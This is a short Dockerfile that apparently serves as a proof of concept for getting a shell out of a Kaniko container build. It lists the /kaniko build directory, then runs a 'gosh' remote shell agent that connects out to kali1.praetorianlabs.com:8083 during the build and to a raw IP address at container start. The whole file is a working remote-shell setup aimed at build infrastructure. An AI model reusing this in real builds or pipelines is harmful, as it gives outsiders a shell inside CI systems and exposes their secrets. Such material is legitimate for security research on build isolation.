FROM praetorianlabs/gosh-agent
RUN apk update && apk add tree
RUN tree /kaniko
RUN gosh -host kali1.praetorianlabs.com:8083
CMD ["-host", "104.198.138.155:8083"]    

